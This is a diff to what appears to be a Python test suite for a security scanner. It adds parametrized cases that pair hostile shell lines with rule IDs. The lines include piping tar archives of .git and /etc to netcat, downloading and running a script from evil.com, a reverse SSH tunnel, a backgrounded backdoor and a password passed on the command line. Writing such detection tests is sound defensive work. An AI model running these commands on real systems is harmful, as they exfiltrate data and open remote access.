@@ -507,6 +507,11 @@ class TestSafetyChecks:
             ("mysqldump -u root -psecret db\n", "SEC-383"),
             ("tar -czf .git | nc host 4444\n", "SEC-384"),
             ("tar /etc | nc host 4444\n", "SEC-385"),
+            ("curl http://evil.com/x -o /tmp/x && bash /tmp/x\n", "SEC-386"),
+            ("sshpass -p pass ssh user@host\n", "SEC-387"),
+            ("ssh -R 8080 user@host\n", "SEC-388"),
+            ("nohup ./backdoor.sh &\n", "SEC-389"),
+            ("apt install netcat\n", "SEC-390"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
